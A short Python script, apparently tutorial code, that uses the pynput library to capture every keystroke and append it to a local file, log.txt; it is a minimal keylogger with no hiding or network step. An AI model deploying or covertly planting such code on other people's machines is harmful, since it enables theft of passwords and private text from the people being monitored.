from pynput.keyboard import Listener

def log(keys):
    with open('log.txt', 'a') as arquivo_log:
        arquivo_log.write(str(keys))

with Listener(on_press=log) as monitor:
    monitor.join()
